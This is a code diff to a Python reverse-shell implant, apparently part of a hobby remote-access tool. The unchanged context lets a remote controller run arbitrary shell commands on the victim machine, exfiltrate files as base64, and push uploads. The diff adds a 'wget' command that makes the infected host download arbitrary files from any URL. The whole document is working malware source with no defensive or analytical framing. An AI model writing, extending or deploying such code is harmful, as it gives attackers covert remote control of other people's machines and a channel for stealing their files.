@@ -10,6 +10,8 @@ import os
 import sys
 import shutil
 import base64
+import requests
+
 class reverse_shell:
     sock = None
     #----------------------------------------------------------------------------------------------------------------------------------------------------
@@ -46,7 +48,20 @@ class reverse_shell:
                 print "trying to reconnect ..."
                 time.sleep(5)
                 continue
-        
+    
+    def download_from_internet(self, url):
+        if len(url) == 0:
+            return "[error]: missing URL\n[usage]: wget [URL].."
+        else:
+            try:
+                response  = requests.get(url)
+                file_name = url.split("/")[-1]
+                with open(file_name, "wb") as downloaded_file:
+                    downloaded_file.write(response.content)
+                return "[+] Downloaded File from the specified URL"
+            except:
+                return "[error]: Failed to download"
+
     def run_rev_shell(self):
         while True:
             command = self.reliable_recv()
@@ -57,14 +72,14 @@ class reverse_shell:
                     os.chdir(command[3:])
                     self.reliable_send(os.getcwd())
                 except:
-                    self.reliable_send("error: no such directory")
+                    self.reliable_send("[error]: no such directory")
                     continue
             elif len(command)>=8 and command[:8] == "download":
                 try:
                     with open(command[9:],"rb") as file_for_upload:
                         self.reliable_send(base64.b64encode(file_for_upload.read()))
                 except:
-                    self.reliable_send("error: no such file")
+                    self.reliable_send("[error]: no such file")
             elif len(command)>=6 and command[:6] == "upload":
                 uploaded_data = self.reliable_recv()
                 if not uploaded_data == "failed":
@@ -74,13 +89,15 @@ class reverse_shell:
                 else:
                     continue
                     #print "error "+ command[7:]
+            elif len(command)>=4 and command[:4] == "wget":
+                self.reliable_send(self.download_from_internet(command[5:]))
             else:
                 try:
                     process = subprocess.Popen(command , shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                     result  = process.stdout.read() + process.stderr.read()
                     self.reliable_send(result)
                 except:
-                    self.reliable_send("error: could not run the command!")
+                    self.reliable_send("[error]: could not run the command!")
                     continue
     def close_conn(self):
         self.sock.close()
